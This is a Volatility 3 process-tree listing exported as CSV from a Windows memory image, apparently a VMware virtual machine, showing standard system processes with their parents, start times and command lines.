Volatility 3 Framework 2.8.0,,,,,,,,,,,,
,,,,,,,,,,,,
PID,PPID,ImageFileName,Offset(V),Threads,Handles,SessionId,Wow64,CreateTime,ExitTime,Audit,Cmd,Path
,,,,,,,,,,,,
4,0,System,0xc90c0345b040,138,-,N/A,FALSE,2024-07-04 10:44:48.000000 UTC,N/A,-,-,-
* 1452,4,MemCompression,0xc90c03551040,66,-,N/A,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,MemCompression,-,-
* 92,4,Registry,0xc90c0349e080,4,-,N/A,FALSE,2024-07-04 10:44:43.000000 UTC,N/A,Registry,-,-
* 300,4,smss.exe,0xc90c06148040,2,-,N/A,FALSE,2024-07-04 10:44:48.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\smss.exe,-,-
416,404,csrss.exe,0xc90c070af140,11,-,0,FALSE,2024-07-04 10:44:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\csrss.exe,"%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,20480,768 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=sxssrv,4 ProfileControl=Off MaxRequestThreads=16",C:\Windows\system32\csrss.exe
492,404,wininit.exe,0xc90c07164080,1,-,0,FALSE,2024-07-04 10:44:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\wininit.exe,-,-
* 636,492,lsass.exe,0xc90c070ab080,8,-,0,FALSE,2024-07-04 10:44:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\lsass.exe,C:\Windows\system32\lsass.exe,C:\Windows\system32\lsass.exe
* 628,492,services.exe,0xc90c070ad140,8,-,0,FALSE,2024-07-04 10:44:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\services.exe,C:\Windows\system32\services.exe,C:\Windows\system32\services.exe
** 5760,628,svchost.exe,0xc90c0986a2c0,7,-,0,FALSE,2024-07-04 10:45:13.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,-,-
** 6016,628,svchost.exe,0xc90c0967d080,9,-,0,FALSE,2024-07-04 10:46:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,-,-
** 2956,628,svchost.exe,0xc90c08637240,26,-,0,FALSE,2024-07-04 10:44:53.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,-,-
** 7692,628,SgrmBroker.exe,0xc90c0a1c5240,7,-,0,FALSE,2024-07-04 10:46:53.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\SgrmBroker.exe,-,-
** 656,628,svchost.exe,0xc90c07d5f2c0,23,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p,C:\Windows\System32\svchost.exe
** 1040,628,svchost.exe,0xc90c07da8280,22,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p,C:\Windows\System32\svchost.exe
*** 3504,1040,ctfmon.exe,0xc90c08838240,10,-,1,FALSE,2024-07-04 10:44:59.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\ctfmon.exe,ctfmon.exe,C:\Windows\system32\ctfmon.exe
** 1680,628,svchost.exe,0xc90c0350d080,6,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k appmodel -p,C:\Windows\system32\svchost.exe
** 9340,628,svchost.exe,0xc90c09ad4080,3,-,0,FALSE,2024-07-15 04:14:05.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k WbioSvcGroup,C:\Windows\system32\svchost.exe
** 1688,628,svchost.exe,0xc90c03509080,5,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,-,-
** 1944,628,svchost.exe,0xc90c080cc080,16,-,0,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p,C:\Windows\system32\svchost.exe
** 1696,628,svchost.exe,0xc90c03507080,15,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,-,-
** 1952,628,svchost.exe,0xc90c080cd080,10,-,0,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,-,-
** 2080,628,svchost.exe,0xc90c0821f080,13,-,0,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k utcsvc -p,C:\Windows\System32\svchost.exe
** 420,628,svchost.exe,0xc90c07d462c0,16,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p,C:\Windows\system32\svchost.exe
** 7460,628,OfficeClickToR,0xc90c0c8ea080,19,-,0,FALSE,2024-07-15 04:06:45.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,-,-
*** 10108,7460,AppVShNotify.e,0xc90c0c8d7080,3,-,1,FALSE,2024-07-15 04:14:55.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\Common Files\microsoft shared\ClickToRun\AppVShNotify.exe,-,-
** 2216,628,wlms.exe,0xc90c08167240,2,-,0,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\wlms\wlms.exe,-,-
** 2856,628,msdtc.exe,0xc90c08527280,9,-,0,FALSE,2024-07-04 10:44:53.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\msdtc.exe,-,-
** 2736,628,dllhost.exe,0xc90c08548280,11,-,0,FALSE,2024-07-04 10:44:53.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\dllhost.exe,-,-
** 6268,628,SecurityHealth,0xc90c082ab080,9,-,0,FALSE,2024-07-04 10:45:15.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\SecurityHealthService.exe,C:\Windows\system32\SecurityHealthService.exe,C:\Windows\system32\SecurityHealthService.exe
** 3252,628,svchost.exe,0xc90c08759300,14,-,1,FALSE,2024-07-04 10:44:59.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k UnistackSvcGroup,C:\Windows\system32\svchost.exe
** 440,628,svchost.exe,0xc90c07d3e240,73,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs -p,C:\Windows\system32\svchost.exe
*** 3216,440,sihost.exe,0xc90c087450c0,11,-,1,FALSE,2024-07-04 10:44:59.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\sihost.exe,sihost.exe,C:\Windows\system32\sihost.exe
*** 1608,440,taskhostw.exe,0xc90c09762080,5,-,1,FALSE,2024-07-15 04:13:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\taskhostw.exe,taskhostw.exe,C:\Windows\system32\taskhostw.exe
*** 3316,440,taskhostw.exe,0xc90c087d4300,9,-,1,FALSE,2024-07-04 10:44:59.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\taskhostw.exe,taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},C:\Windows\system32\taskhostw.exe
** 2232,628,vm3dservice.ex,0xc90c08169240,3,-,0,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\vm3dservice.exe,-,-
*** 2388,2232,vm3dservice.ex,0xc90c0838a200,4,-,1,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\vm3dservice.exe,-,-
** 832,628,svchost.exe,0xc90c092e2080,7,-,1,FALSE,2024-07-15 07:00:06.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k PrintWorkflow,C:\Windows\system32\svchost.exe
** 1864,628,spoolsv.exe,0xc90c0809f200,12,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe
** 2248,628,vmtoolsd.exe,0xc90c08127080,11,-,0,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\VMware\VMware Tools\vmtoolsd.exe,-,-
** 3148,628,svchost.exe,0xc90c08aad080,11,-,1,FALSE,2024-07-04 10:45:01.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p,C:\Windows\system32\svchost.exe
** 2256,628,VGAuthService.,0xc90c08166080,2,-,0,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe,-,-
** 9296,628,SearchIndexer.,0xc90c07f3a080,17,-,0,FALSE,2024-07-15 04:16:20.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\system32\SearchIndexer.exe
*** 8864,9296,SearchFilterHo,0xc90c0a077080,5,-,0,FALSE,2024-07-15 06:59:00.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\SearchFilterHost.exe,C:\Windows\system32\SearchFilterHost.exe 0 804 808 816 8192 812 788,C:\Windows\system32\SearchFilterHost.exe
*** 6388,9296,SearchProtocol,0xc90c098dc080,7,-,0,FALSE,2024-07-15 06:58:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\SearchProtocolHost.exe,C:\Windows\system32\SearchProtocolHost.exe Global\UsGthrFltPipeMssGthrPipe3_ Global\UsGthrCtrlFltPipeMssGthrPipe3 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"",C:\Windows\system32\SearchProtocolHost.exe
*** 4164,9296,SearchProtocol,0xc90c0863a080,4,-,1,FALSE,2024-07-15 04:17:20.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\SearchProtocolHost.exe,C:\Windows\system32\SearchProtocolHost.exe Global\UsGthrFltPipeMssGthrPipe_S-1-5-21-3274565340-3808842250-3617890653-10012_ Global\UsGthrCtrlFltPipeMssGthrPipe_S-1-5-21-3274565340-3808842250-3617890653-10012 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon""  ""1"",C:\Windows\system32\SearchProtocolHost.exe
** 1112,628,svchost.exe,0xc90c07dc72c0,41,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k LocalService -p,C:\Windows\system32\svchost.exe
** 2272,628,MsMpEng.exe,0xc90c08168080,9,-,0,FALSE,2024-07-04 10:44:52.000000 UTC,N/A,\Device\HarddiskVolume3\Program Files\Windows Defender\MsMpEng.exe,C:\Program Files\Windows Defender\MsMpEng.exe,C:\Program Files\Windows Defender\MsMpEng.exe
** 872,628,svchost.exe,0xc90c07c6f2c0,16,-,0,FALSE,2024-07-04 10:44:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k RPCSS -p,C:\Windows\system32\svchost.exe
** 6760,628,svchost.exe,0xc90c09408080,8,-,0,FALSE,2024-07-04 10:46:54.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p,C:\Windows\System32\svchost.exe
** 1260,628,svchost.exe,0xc90c07e7a2c0,24,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k NetworkService -p,C:\Windows\System32\svchost.exe
** 1520,628,svchost.exe,0xc90c07f5a2c0,12,-,0,FALSE,2024-07-04 10:44:51.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p,C:\Windows\System32\svchost.exe
*** 7428,1520,audiodg.exe,0xc90c03542080,6,-,0,FALSE,2024-07-15 06:58:15.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\audiodg.exe,C:\Windows\system32\AUDIODG.EXE 0x4f0,C:\Windows\system32\AUDIODG.EXE
** 7792,628,svchost.exe,0xc90c08ee8080,3,-,0,FALSE,2024-07-04 10:46:35.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k LocalService -p,C:\Windows\system32\svchost.exe
** 764,628,svchost.exe,0xc90c07bef240,23,-,0,FALSE,2024-07-04 10:44:50.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p,C:\Windows\system32\svchost.exe
*** 4356,764,StartMenuExper,0xc90c08c8e080,13,-,1,FALSE,2024-07-04 10:45:02.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe,C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca,C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe
*** 1400,764,RuntimeBroker.,0xc90c0c717080,4,-,1,FALSE,2024-07-15 04:09:52.000000 UTC,N/A,\Device\HarddiskVolume3\Windows\System32\RuntimeBroker.exe,-,-
